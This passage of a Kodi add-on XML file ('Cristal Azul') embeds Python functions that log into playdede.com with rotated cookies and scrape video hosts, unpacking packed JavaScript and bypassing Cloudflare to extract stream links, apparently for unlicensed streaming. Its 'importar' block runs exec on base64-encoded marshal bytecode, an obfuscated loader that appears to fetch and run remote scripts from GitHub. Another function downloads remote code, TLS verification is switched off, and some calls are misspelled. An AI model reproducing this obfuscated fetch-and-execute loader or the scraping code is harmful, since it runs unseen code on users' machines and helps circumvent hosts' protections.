            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL
 
  if 'gamovideo' in url:
    try:
        if 'https' in url:
            url = url.replace('https','http')
        ua = AgenteCristal()
        headers = {"User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3","Alt-Used": "gamovideo.com:443","Upgrade-Insecure-Requests": "1","Cache-Control": "max-age=0", "cookie": "gam=1"}
        source = requests.get(url, headers=headers, verify=False).text
        source = six.ensure_str(source)
        #ArchivoDestino = xbmc.translatePath('special://home/addons/plugin.video.cristalazul/')
        #open(ArchivoDestino + 'html.txt','wb').write(source)
        pack = re.findall('javascript.*?(eval\(function\(p,a,c,k,e,d.*)', source)[0]
        unpack = six.ensure_str(jsunpack.unpack(pack)).replace('\\', '')    
        u = re.findall('file:\s*"(http.*?)"', unpack)[0]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
            #u = xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]enlace caido [/COLOR], 4000)")
    return u
  elif '.torrent' in url or 'magnet:' in url:
    addon = xbmcaddon.Addon('plugin.video.cristalazul')
    elecion_torrent = addon.getSetting('TodosTorrent')
    if 'Ninguno' == elecion_torrent:
      import xbmcgui
      dialog = xbmcgui.Dialog()
      ret = dialog.select('Reproducir con:', ['[COLOR white]Quasar[/COLOR]', '[COLOR white]Torrenter[/COLOR]', '[COLOR white]Elementum[/COLOR]', '[COLOR white]Torrentin[/COLOR]'])
      channels = [
   'plugin://plugin.video.quasar/play?uri='+url+'&image=imageurl&player=0',
   'plugin://plugin.video.torrenter/?action=playSTRM&url='+url+'&image=imageurl&player=0',
   'plugin://plugin.video.elementum/play?uri='+url+'&image=imageurl&player=0',
   'plugin://plugin.video.torrentin/?uri='+url+'&image=imageurl&player=0']  
      return channels[ret]
    elif 'Quasar' == elecion_torrent:
      return 'plugin://plugin.video.quasar/play?uri='+url+'&image=imageurl&player=0'
    elif 'Torrentin' == elecion_torrent:
      return 'plugin://plugin.video.torrentin/?uri='+url+'&image=imageurl&player=0'
    elif 'Torrenter' == elecion_torrent:
      return 'plugin://plugin.video.torrenter/?action=playSTRM&url='+url+'&image=imageurl&player=0'
    else:
      return 'plugin://plugin.video.elementum/play?uri='+url+'&image=imageurl&player=0'
  elif 'supervideo.tv' in url:
    try:
        ua = AgenteCristal()
        s=requests.session()
        rsource=s.get(url, headers={'User-Agent': ua},  verify=False)
        source=s.get(url, headers={'User-Agent': ua},  verify=False)
        pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', six.ensure_str(source.text))[0]
        unpack=jsunpack.unpack(pack)
        u = re.findall('file:\s*"(http.{0,100}mp4)"', unpack)[0]+'|User-Agent='+ua
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'mixdrop' in url:
    url = url.replace('/f/','/e/').replace('.co','.to')
    try:
        ua = AgenteCristal()
        scraper = cfscrape.create_scraper()
        source=scraper.get(url, headers={'User-Agent':ua}, verify=False)
        source_text = six.ensure_str(source.text)
        if 'eval(function' in source_text:
           pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', source_text)[0]
           unpack=jsunpack.unpack(pack)
           url2 = 'https:' + re.findall('wurl="(.*?)"', unpack)[0]
           servidor_inicial = re.findall('//(.*?)/',url2)[0]
           cambio_servidor = re.findall('ipr=(.*?)"', six.ensure_str(requests.post('http://www.mon-ip.com/direccion-ip-sitio.php', headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0','referer':'http://www.mon-ip.com/direccion-ip-sitio.php','x-requested-with':'XMLHttpRequest'},data={'add':'1','domaine':servidor_inicial,'mss':''}).text))[0]
           servidor_final = url2.replace(servidor_inicial,cambio_servidor)
           return servidor_final
        else:
          source2 = 'https://mixdrop.to' + re.findall('"(.*?)\"',source_text)[0] + 'https://mixdrop.to/'
          source3 = scraper.get(source2, headers={'User-Agent':ua}, verify=False)
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', six.ensure_str(source3.text))[0]
          unpack=jsunpack.unpack(pack)
          return 'https:' + re.findall('wurl="(.*?)"', unpack)[0]
    except:
      try:
          u = resolveurl.resolve(url)
      except Exception as e:
          u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
      return u

  elif 'google' in url:
    try:
        id = re.findall("([-\w]{25,})", url)[0]
        u = 'plugin://plugin.video.gdrive/?mode=video&amp;instance=gdrive1&amp;filename=' + id + '&amp;content_type=video'
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

  elif 'dailymotion' in url:
    try:
        url = 'https://www.dailymotion.com/embed/video/'+url.split('/')[-1]
        m3u8 = re.findall('URL"."url":"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':'ipad'},verify=False).content))[0].replace('\/', '/')
        return re.findall('\s*(h.*?)\s',six.ensure_str(requests.get(m3u8,headers={'user-agent':'ipad'},verify=False).content))[-1]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

  elif 'mega' in url:
    try:
      video_urls = []


      c = Client(url=url.replace('/file/','/embed#!').replace('/embed/','/embed#!').replace('#!#!','#!'), 
      is_playing_fnc=xbmc.Player().isPlaying())
      files = c.get_files()

      if len(files) > 5:
        media_url = c.get_play_list()
        video_urls.append([get_filename_from_url(media_url)[-4:], media_url])
      else:
        for f in files:
            media_url = f["url"]
            video_urls.append([get_filename_from_url(media_url)[-4:], media_url])

      return video_urls[0][1]
    except Exception as e:
        return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))

  elif 'clipwatching' in url:
    try:
        ua = AgenteCristal()
        u = re.findall('sources:.*?"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0] + '|User-Agent=' + AgenteCristal()
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'cloudvideo' in url:
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cloudvideo.tv/'}, timeout=10, verify=False).content
        response = six.ensure_str(response)
        datos = re.findall('(?s)name="op" value="(.*?)".*?name="usr_login" value="(.*?)".*?name="id" value="(.*?)".*?name="fname" value="(.*?)".*?name="hash" value="(.*?)".*?name="imhuman" value="(.*?)"', response)
        source=requests.post(url,headers={'User-Agent':'Mozilla/5.0','referer':url},data={'op':datos[0][0],'usr_login':datos[0][1],'id':datos[0][2],'fname':urllib_parse.quote_plus(datos[0][3]),'referer':'','hash':datos[0][4],'imhuman':urllib_parse.quote_plus(datos[0][5])}).text
        source = six.ensure_str(source)
        pack = re.findall('javascript.*?(eval\(function\(p,a,c,k,e,d.*)', source)[0]
        unpack=jsunpack.unpack(pack)
        xbmc.log('miraaaaaaa: %s' % (unpack), xbmc.LOGNOTICE)
        u = re.findall('src:"(.*?)"', unpack)[0]
    except:
        try:
            u = resolveurl.resolve(url)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'vidoza' in url:
    try:
        mozhdr4 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html4 = requests.get(url, headers=mozhdr4, verify=False).text
        html4 = six.ensure_src(html4)
        u = re.findall('["\']?\s*(?:file|src)\s*["\']?\s*[:=,]?\s*["\'](?P<url>[^"\']+)(?:[^}>\]]+)["\']?\s*res', html4)[0] + '|User-Agent=' + AgenteCristal()
    except:
        u = xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]enlace caido [/COLOR], 4000)")
    return u
  elif 'gloria' in url:
    try:
        mozhdr4 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html4 = requests.get(url, headers=mozhdr4, verify=False).text
        html4 = six.ensure_src(html4)
        u = re.findall('(?:file|src)\s*=["\'](http.*?)["\']', html4)[0].replace('&amp;','&') + '|User-Agent=' + AgenteCristal()
    except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'videobin' in url:
    try:
        u = url.replace('.html', '.ogg') + '|User-Agent=' + AgenteCristal()
    except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'ulozto' in url:
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
            'Referer': 'https://uloz.to/'}
    page = requests.get(url, headers=headers, cookies=Cookie_Jar).content
    page = six.ensure_src(page)
    try:
      eurl = re.findall('getPreviewURL":"(.*?)"', page)[0]
      eurl = 'https://uloz.to' + eurl.replace('\/','/')
      url = requests.get(eurl, headers=headers, cookies=Cookie_Jar).json()['streamPreviewUrl']
      u='{}|{}'.format(url, urllib_parse.urlencode(headers))
    except:
      try:
        u = 'https:' + re.findall('URL":"(.*?)"', page)[0].replace('\/','/')
      except Exception as e:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'flixplayer' in url:
    try:
        ua = AgenteCristal()
        u = re.findall('link":"(.*?mp4)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0] + '|User-Agent=' + AgenteCristal()
    except:
        try:
            Link = re.findall('link":"(.*?)"',six.ensure_str(requests.get(url,headers={'user-agent':ua},verify=False).content))[0].replace('embed-','')
            u = resolveurl.resolve(Link)
        except Exception as e:
            u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u
  elif 'openload' in url:
    try:
        mozhdr = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Servidor Openload muerto [/COLOR], 4000)")
    except:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Servidor Openload muerto [/COLOR], 4000)")
    return u
  elif 'uptobox' in url:
    try:
        mozhdr3 = {'User-Agent': AgenteCristal(), 'Referer': 'http://www.seriespapaya.net/'}
        html3 = requests.get(url, headers=mozhdr3, verify=False).text
        html3 = six.ensuere_str(html3)
        part1 = re.findall('(by its owner|uploaded with File Uploader)', html3)[0]
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    except:
        H = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul_[COLOR gold]Uptobox[/COLOR],[COLOR gold]Limite 120minutos diarios con esta ip[/COLOR], 5000)")
        u = resolveurl.resolve(url)
    return u
  else:
    try:
        u = resolveurl.resolve(url)
    except:
        u = xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],{}, 4000)".format("Enlace caido"))
    return u

def get_filename_from_url(url=url.replace('/file/','/embed#!').replace('/embed/','/embed#!').replace('#!#!','#!')):
    parsed_url = urllib_parse.urlparse(url)
    try:
        filename = parsed_url.path
    except:
        if len(parsed_url) >= 4:
            filename = parsed_url[2]
        else:
            filename = ""

    if "/" in filename:
        filename = filename.split("/")[-1]

    return filename

def AgenteCristal():
    url= 'https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/AgenteCristal'
    agente = {'User-Agent': 'Mozilla/5.0'}
    extraer = requests.get(url, headers=agente)
    AgenteCristal = re.findall("(.*?)CRISTAL", six.ensure_str(extraer.text))[0]
    return AgenteCristal
 
]]></expres>
            <page></page>
        </regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>








</items>
